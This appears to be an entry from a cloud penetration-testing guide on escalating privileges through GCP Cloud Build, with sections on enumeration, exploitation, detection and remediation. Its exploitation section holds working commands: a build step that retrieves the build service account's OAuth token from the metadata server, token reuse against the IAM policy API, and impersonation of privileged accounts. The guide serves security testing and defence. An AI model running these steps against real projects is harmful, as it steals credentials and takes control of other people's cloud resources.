---
cstg_id: CSTG-GCP-CLOUD-BUILD-PRIVESC
title: "GCP Cloud Build - Privilege Escalation"
provider: gcp
service: cloud-build
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - cloudbuild.builds.create
  - iam.serviceAccounts.actAs
tools: [gcloud, curl]
references:
  - "https://cloud.google.com/build/docs/cloud-build-service-account"
  - "https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/"
  - "https://cloud.google.com/iam/docs/service-account-overview"
license: CC BY-SA 4.0
---

## Summary

A build submitted to Cloud Build runs with the credentials of the build's service account. If a
principal can submit a build (`cloudbuild.builds.create`) and that build runs as a more-privileged
service account, the principal effectively inherits that account's permissions for the duration of
the build. The canonical path is to submit a build whose steps read the build identity's access
token from the metadata server and use it (or simply perform privileged API calls directly within
the build). This is one of the most common GCP privilege-escalation routes because the default Cloud
Build service account is frequently over-privileged.

## Prerequisites

`cloudbuild.builds.create` on the project. To run a build as a *specific* user-managed service
account also requires `iam.serviceAccounts.actAs` on that account; builds running as the default
Cloud Build SA do not require an explicit `actAs` from the submitter.

## Enumeration

Confirm the build identity's effective roles before relying on this path (see
[Cloud Build - Enumeration](../02-services/gcp-cloud-build-enum.md)):

```bash
gcloud projects get-iam-policy <project> \
  --flatten='bindings[].members' \
  --filter='bindings.members:cloudbuild.gserviceaccount.com' \
  --format='table(bindings.role)'
```

## Exploitation

### `cloudbuild.builds.create` (run as the build service account)

Submit a build that reads the build SA's OAuth token from the metadata server; that token then
carries the build SA's privileges and can be used from anywhere until it expires.

```yaml
# cloudbuild.yaml
steps:
  - name: 'gcr.io/cloud-builders/curl'
    entrypoint: 'bash'
    args:
      - '-c'
      - |
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

```bash
gcloud builds submit --no-source --config cloudbuild.yaml
```

The recovered token can be used directly:

```bash
curl -s -H "Authorization: Bearer <token>" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/<project>/getIamPolicy" -X POST
```

If the build SA holds `roles/editor` or IAM-administration roles, this yields broad control of the
project, including granting roles to an attacker-controlled principal.

### `iam.serviceAccounts.actAs` over a privileged service account

Where the submitter can set the build's service account, point the build at a more-privileged
user-managed SA and repeat the token-retrieval step to obtain that account's privileges.

```bash
gcloud builds submit --no-source --config cloudbuild.yaml \
  --service-account=projects/<project>/serviceAccounts/<privileged-sa>@<project>.iam.gserviceaccount.com
```

## Misconfigurations & Findings

- Default Cloud Build SA granted `roles/editor` or other broad roles.
- `cloudbuild.builds.create` available to non-CI principals.
- `iam.serviceAccountUser` / `actAs` granted over powerful service accounts to build submitters.

## Detection & Logging

`CreateBuild` is recorded in **Cloud Audit Logs** Admin Activity with the submitting principal.
Subsequent use of the build SA's token appears as that **service account** acting (the calling
identity in downstream audit logs is the SA, not the original principal) - correlate a `CreateBuild`
by an unusual principal with subsequent privileged SA activity. Alert on builds submitted by
identities outside the CI/CD pipeline.

## Remediation & Hardening

- Run builds as a **least-privilege user-managed service account**; remove broad roles from the
  default Cloud Build SA.
- Restrict `cloudbuild.builds.create` to CI/CD administrators and automation.
- Avoid granting `actAs`/`serviceAccountUser` over privileged accounts to build submitters.
- Use VPC Service Controls and build provenance (SLSA) to constrain what builds can reach and prove
  what produced an artifact.

## Tools

- **gcloud** - submit builds and inspect IAM.
- **curl** - retrieve and exercise tokens from the metadata server within a build step.

## References

- Google Cloud - Cloud Build service account
- Rhino Security Labs - GCP privilege escalation via Cloud Build
- Google Cloud - Service account overview
